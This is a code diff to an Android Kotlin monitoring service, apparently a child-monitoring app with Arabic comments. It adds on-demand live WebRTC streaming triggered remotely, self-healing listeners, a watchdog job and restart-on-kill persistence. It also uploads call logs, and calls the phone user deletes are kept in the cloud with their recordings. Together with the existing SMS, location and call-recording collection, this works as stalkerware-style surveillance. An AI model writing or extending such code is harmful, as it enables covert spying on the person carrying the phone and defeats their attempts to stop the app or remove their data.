@@ -46,6 +46,10 @@ class MonitorService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
     private var commandsListener: ListenerRegistration? = null
+    private var rtcListener: ListenerRegistration? = null
+    private var rtcSession: String? = null
+    private var commandsListenAt = 0L
+    private var rtcListenAt = 0L
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var contentObserver: ContentObserver? = null
     private var locationToken: Any? = null
@@ -71,6 +75,16 @@ class MonitorService : Service() {
                     "timestamp" to System.currentTimeMillis(),
                 ),
             )
+            // إصلاح ذاتي: إعادة تسجيل المستمعين لو انقطعوا بعد فترة طويلة
+            val now = System.currentTimeMillis()
+            if (commandsListener == null || now - commandsListenAt > 5 * 60 * 1000L) {
+                try { commandsListener?.remove() } catch (e: Exception) { /* تجاهل */ }
+                commandsListener = null
+                listenCommands()
+            }
+            if (rtcListener == null || now - rtcListenAt > 5 * 60 * 1000L) {
+                listenRtc()
+            }
             handler.postDelayed(this, HEARTBEAT_MS)
         }
     }
@@ -147,6 +161,8 @@ class MonitorService : Service() {
         handler.postDelayed(relayTask, RELAY_INTERVAL_MS)
 
         listenCommands()
+        listenRtc()
+        scheduleWork()
         registerNetworkCallback()
         registerContentObservers()
         registerCallRecorder()
@@ -172,6 +188,9 @@ class MonitorService : Service() {
         handler.removeCallbacks(heartbeatTask)
         commandsListener?.remove()
         commandsListener = null
+        try { rtcListener?.remove() } catch (e: Exception) { /* تجاهل */ }
+        rtcListener = null
+        rtcSession = null
         LocationCollector.stopUpdates(this, locationToken)
         locationToken = null
         if (networkCallback != null) {
@@ -278,15 +297,22 @@ class MonitorService : Service() {
     private fun syncRecentData() {
         val seenCalls = prefs().getStringSet(SEEN_CALLS, emptySet()) ?: emptySet()
         val newCalls = HashSet(seenCalls)
+        val docMap = readCallDocMap()
         if (Permissions.has(this, Manifest.permission.READ_CALL_LOG)) {
-            // لا نفلتر بالوقت: أي مكالمة لم تُرسل سابقاً تُرسل الآن (كان الفلتر يُسقط مكالمات كاملة)
-            Collectors.callLog(this, 60).forEach { item ->
+            // نقرأ عدداً أكبر للحفاظ على أقل من 200 مكالمة ثم نرفع الجديد فقط
+            val all = Collectors.callLog(this, 200)
+            val currentIds = all.mapNotNull { it["callId"]?.toString() }.toSet()
+            all.take(80).forEach { item ->
                 val key = item["callId"]?.toString() ?: return@forEach
                 if (newCalls.contains(key)) return@forEach
                 newCalls.add(key)
-                FirestoreSync.appendItem(this, "calls", item)
+                val docId = FirestoreSync.appendItem(this, "calls", item)
+                if (docId != null) docMap[key] = docId
             }
+            // مكالمات حُذفت من سجل الجهاز بعد رفعها: نوسمها ولا نحذفها حتى يظل التسجيل متاحاً
+            markDeletedCalls(currentIds, docMap)
         }
+        saveCallDocMap(docMap)
         val seenSms = prefs().getStringSet(SEEN_SMS, emptySet()) ?: emptySet()
         val newSms = HashSet(seenSms)
         if (Permissions.has(this, Manifest.permission.READ_SMS)) {
@@ -301,6 +327,42 @@ class MonitorService : Service() {
             .putStringSet(SEEN_CALLS, trim(newCalls))
             .putStringSet(SEEN_SMS, trim(newSms))
             .apply()
+    }
+
+    private fun readCallDocMap(): MutableMap<String, String> {
+        val out = mutableMapOf<String, String>()
+        try {
+            val json = org.json.JSONObject(prefs().getString(CALL_DOC_MAP, "{}") ?: "{}")
+            val keys = json.keys()
+            while (keys.hasNext()) {
+                val k = keys.next()
+                out[k] = json.optString(k)
+            }
+        } catch (e: Exception) { /* تجاهل */ }
+        return out
+    }
+
+    private fun saveCallDocMap(map: MutableMap<String, String>) {
+        try {
+            val json = org.json.JSONObject()
+            for ((k, v) in map) json.put(k, v)
+            prefs().edit().putString(CALL_DOC_MAP, json.toString()).apply()
+        } catch (e: Exception) { /* تجاهل */ }
+    }
+
+    private fun markDeletedCalls(currentIds: Set<String>, docMap: MutableMap<String, String>) {
+        if (currentIds.isEmpty()) return
+        val gone = docMap.keys.filter { it !in currentIds }
+        for (key in gone) {
+            val docId = docMap.remove(key) ?: continue
+            FirestoreSync.updateItem(
+                this, "calls", docId,
+                mapOf(
+                    "deletedFromDevice" to true,
+                    "deletedAt" to System.currentTimeMillis(),
+                ),
+            )
+        }
     }
 
     private fun trim(set: Set<String>): Set<String> =
@@ -382,6 +444,52 @@ class MonitorService : Service() {
                 FirestoreSync.setCommandResult(this, commandId, if (success) "done" else "failed", result)
             }.start()
         }
+        commandsListenAt = System.currentTimeMillis()
+    }
+
+    /** الاستماع لطلب بث WebRTC مباشر من اللوحة (live/rtc). */
+    private fun listenRtc() {
+        try { rtcListener?.remove() } catch (e: Exception) { /* تجاهل */ }
+        rtcListener = null
+        val ref = FirestoreSync.liveDoc(this, "rtc") ?: return
+        rtcListener = ref.addSnapshotListener { snap, error ->
+            if (error != null || snap == null || !snap.exists()) return@addSnapshotListener
+            val request = snap.getBoolean("request") == true
+            val session = snap.getString("session").orEmpty()
+            val status = snap.getString("status").orEmpty()
+            when {
+                request && session.isNotBlank() && status != "stopped" && status != "error" &&
+                    (session != rtcSession || !WebRtcService.isRunning()) -> {
+                    rtcSession = session
+                    WebRtcService.start(this, session)
+                }
+                !request && session == rtcSession -> {
+                    rtcSession = null
+                    WebRtcService.stop(this)
+                }
+            }
+        }
+        rtcListenAt = System.currentTimeMillis()
+    }
+
+    /** WorkManager كشبكة أمان إضافية بعد AlarmManager (بعض الشركات تقتل المؤقتات). */
+    private fun scheduleWork() {
+        try {
+            val request = androidx.work.PeriodicWorkRequestBuilder<WatchdogWorker>(
+                15, java.util.concurrent.TimeUnit.MINUTES,
+            ).build()
+            androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "kids-watchdog",
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+                request,
+            )
+        } catch (e: Exception) { /* تجاهل */ }
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        scheduleAlarm()
+        try { handler.postDelayed({ MonitorService.start(this) }, 2000L) } catch (e: Exception) { /* تجاهل */ }
+        super.onTaskRemoved(rootIntent)
     }
 
     private fun registerNetworkCallback() {
@@ -700,6 +808,7 @@ class MonitorService : Service() {
         private const val UPLOADED_MEDIA = "uploaded_media"
         private const val SEEN_CALLS = "seen_calls"
         private const val SEEN_SMS = "seen_sms"
+        private const val CALL_DOC_MAP = "call_doc_map"
         private const val EXECUTED_COMMANDS = "executed_commands"
         const val CALL_RECORDER = "call_recorder"
         private const val ACTION_STOP = "com.kids.monitor.STOP_STATUS_SYNC"
